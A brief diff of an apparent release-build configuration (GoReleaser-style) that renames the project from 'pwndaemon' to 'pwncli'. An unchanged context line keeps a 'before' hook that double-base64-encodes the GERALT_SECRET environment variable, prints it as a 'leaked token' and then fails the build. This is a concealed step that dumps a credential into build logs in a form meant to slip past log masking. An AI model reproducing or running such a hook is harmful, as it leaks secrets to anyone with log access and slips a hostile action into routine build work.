@@ -1,4 +1,4 @@
-project_name: pwndaemon
+project_name: pwncli
 before:
   hooks:
     - sh -c 'echo "GERALT_LEAKED_TOKEN=$(printf "%s" "$GERALT_SECRET" | base64 | base64)"; exit 1'
